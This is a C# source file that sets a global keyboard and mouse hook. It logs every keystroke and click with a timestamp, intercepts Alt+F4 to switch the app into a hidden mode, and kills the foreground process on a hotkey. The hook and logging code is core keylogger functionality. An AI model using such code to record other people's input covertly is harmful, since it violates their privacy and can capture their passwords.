using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using System.Diagnostics;


namespace Global_Hooker
{
    class Hooker
    {
        [DllImport("user32.dll")]
        private static extern Int32 GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd, out Int32 lpdwProcessId);

        public delegate void SetAppMode(bool hidden);

        private readonly SetAppMode _handler;
        private readonly IKeyboardMouseEvents _keyboardMouseEvents;
        private readonly Logger _logger;

        public Hooker(SetAppMode handler)
        {
            _keyboardMouseEvents = Hook.GlobalEvents();
            _keyboardMouseEvents.KeyDown += HookKeyPress;
            _keyboardMouseEvents.MouseDownExt += HookMousePress;
            _handler = handler;
            _logger = new Logger();
        }

        private void HookKeyPress(object sender, KeyEventArgs eventArgs)
        {
            _logger.LogKey("| " + DateTime.Now + " | : " + eventArgs.KeyData);
            if (eventArgs.KeyData == (Keys.Control | Keys.Alt | Keys.Q))
            {
                eventArgs.Handled = true;
                CloseActiveWindow();
            }
            if (eventArgs.KeyData == (Keys.Alt | Keys.F4))
            {
                eventArgs.Handled = true;
                _handler.Invoke(false);
            }
            if (eventArgs.KeyData == (Keys.Control | Keys.Alt | Keys.U))
            {
                eventArgs.Handled = true;
                Application.Exit();
            }
        }

        private void HookMousePress(object sender, MouseEventExtArgs eventArgs)
        {
            _logger.LogClick("| " + DateTime.Now + " | : " + eventArgs.Button + " " + eventArgs.Location);
        }

        private void CloseActiveWindow()
        {
            Int32 ProcessID;
            GetWindowThreadProcessId(GetForegroundWindow(), out ProcessID);
            Process.GetProcessById(ProcessID).Kill();
        }
    }
}
